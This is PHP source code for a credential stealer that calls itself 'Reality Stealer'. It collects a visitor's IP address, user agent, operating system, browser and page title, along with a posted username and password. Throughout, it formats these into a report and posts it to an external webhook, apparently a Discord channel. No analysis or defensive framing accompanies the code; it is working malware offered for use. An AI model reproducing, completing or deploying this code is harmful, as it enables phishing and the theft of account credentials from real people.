<?php
$webhook = "";

function receiveInfo(){
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];

    return ":star2: **Reality Stealer New Report**\n". "\nTime of Execution". "```". getDateNow()."```"."\n:desktop: Document Title ```". getTitle(). "```\n:satellite: IP Addr```" . $IP . "```\n :electric_plug: HTTP Req```" . $browserAgent. "```" . "\n". ":computer: Operating System```" . checkOS(). "```" . "\n:rocket: Browser```". Browser() . "```" . "\n" .AccountInfo();
}


function getDateNow(){
    $currentDate = date("d-m-Y-H:i:s");
    return $currentDate;

}
function getTitle(){
    $title = $_POST["pageTitle"];
    return $title;
}

function AccountInfo(){
    $User = $_POST["Username"];
    $Password = $_POST["Password"];

    if ($User && $Password != ""){
        return ":man_frowning: Username/@```" . $User. "```" . "\n:lock: Password```" . $Password . "```\n";
    } else {
        return ":o: No Password enterd!";
    } 
}

function checkOS(){
    $platform = $_POST["os"];
    return $platform;
}

function Browser(){
    $browser = $_POST["Browser"];
    return $browser;
}

function sendData(){
    global $webhook;

    $data = array('content' => receiveInfo());
    
    // use key 'http' even if you send the request to https://...
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        )
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($webhook, false, $context);
    if ($result === FALSE) { /* Handle error */ }
    var_dump($result); 
}

sendData();

?>

